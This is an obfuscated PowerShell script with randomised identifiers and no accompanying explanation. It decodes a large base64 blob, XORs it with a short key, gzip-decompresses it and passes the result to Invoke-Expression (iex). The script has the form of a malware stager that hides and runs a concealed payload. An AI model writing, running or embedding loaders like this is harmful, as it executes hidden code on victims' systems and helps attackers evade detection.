$s0j56mrqx = [System.Text.Encoding]::ascii
function sd90gj3wq7pu  {param($f23ynzuba )
  $ox12f9kvd = [System.Convert]::FromBase64String($f23ynzuba)
  $12tail4ew= $s0j56mrqx.GetBytes("q2k84")
    $yr4tupmqn = $ox12f9kvd
    $3nmj41x0k = $(for ($vd0ci6t8p = 0; $vd0ci6t8p -lt $yr4tupmqn.length; ) {
        for ($zv8g0hw4a = 0; $zv8g0hw4a -lt $12tail4ew.length; $zv8g0hw4a++) {
            $yr4tupmqn[$vd0ci6t8p] -bxor $12tail4ew[$zv8g0hw4a]
            $vd0ci6t8p++
            if ($vd0ci6t8p -ge $yr4tupmqn.Length) {
                $zv8g0hw4a = $12tail4ew.length
            }
        }
    })
	$zv8g0hw4a5ou36dsb = New-Object System.IO.MemoryStream( , $3nmj41x0k )

	    $ug8lidzce = New-Object System.IO.MemoryStream
        $zbuh8dcta = New-Object System.IO.Compression.GzipStream $zv8g0hw4a5ou36dsb, ([IO.Compression.CompressionMode]::Decompress)
	    $zbuh8dcta.CopyTo( $ug8lidzce )
        $zbuh8dcta.Close()
		$zv8g0hw4a5ou36dsb.Close()
		[byte[]] $934y0oxgf = $ug8lidzce.ToArray()
 $a34iqf9pl=$934y0oxgf
    return $a34iqf9pl
}
[byte[]]$uoahfz4i5=sd90gj3wq7pu $nh95zsft2
[System.Text.Encoding]::ascii.GetString((sd90gj3wq7pu "brljODRxMms8NPxmMFfvRyYVpjWMtWh2d5WLuazgPOBvQUQtFxqDWC/QnllaIeJ5HYXAev6aSDjYlIaX6h8MICR4Ih9W64j87gwOd4wKFki8l2sh8ZpavT9MRwjrd35kf0drmn+9qc+7+tJmoD2ig2eCoaz+A6zzYLdgoOreAaYqU7NkscmwXjFFmrPCAfHBqErlJ2eaRPlHGlJIuUnqGYMkewQw2jRuo0l2wL8HvRN40Q2xQ//9+F9j7wC9LtrDcHKFEXjI/6Hj+0717ACNHeHVB9npDjlcQcbCDj6hhNrBxIeLUiTfQMedu2GUfnKx5Bxp79O2yF99qQo8RuGqmmQ9X/o1lohL3DOZei3yotBfStcUrb0gD8j2w1+GNOqyQ4lMhpYCk0ocZFj7J6rBua6fEnVmsB5REYVJOgu8bkFgWTzPT7jfVFR+uUQSF76oxbXU8ItFOJbhJ++Bx1/GlGKRE6nMQZ5HVITLflMS3vSmpbkG9ve5v0EOUItkvroJIWRzE1m1jH8ZOaKUnLWCuvLtnGXc8DeFkksp+oQ+uQ1uoR8cjjJPUutQsCf4KrtuAwAxJc1p92dOlIH5yMvbKeEwQn7CttXzqicU+hmobWznXmcRWkDj9evbtDqV9HJLDvzy6LZX3olYLbp+dMw6bYQJP3I2gy8WrLyD6mj2PI6wyaMur18DGDLVN1uqY5mi6Be/ISRxVS8YZ4w/NQIYcdeBm6Tn4WrSJ1zpCRYWt/GQW75wN51DqqYgoTaH90DvgT0M7Lw6ygBONEmgHs8wb3nG51GCTNOg8H/YtBHCy3FwiXWRVMliOWCuijiW1DfJDbp4YAEDS+F87ksJKMk72vuFubLOCxBUSPENH77innmM6oJOo3drwK3cYAe6eeQtmD1f2xKlV+x+WlyLhuX4ycmBw6iv45fTyXPurn2bPbBxyeOmZXlPwKyb71rFD8SjSsOFPuNGMVTFAJlJXDvDCyoSq+8eTZD70ZzakfZ/TvTI91zuS3hXTALbkvvcgFYX0fu5xLUNDvMfhikmaBny2vHI7KU6x5MelXgquWPssSAuhdjhuo43MgQlO+nCqgrHwRSFAgppKV44Xoip+p9iR9VXYsgiRxA3jje/pETG8m04NA=="))|iex;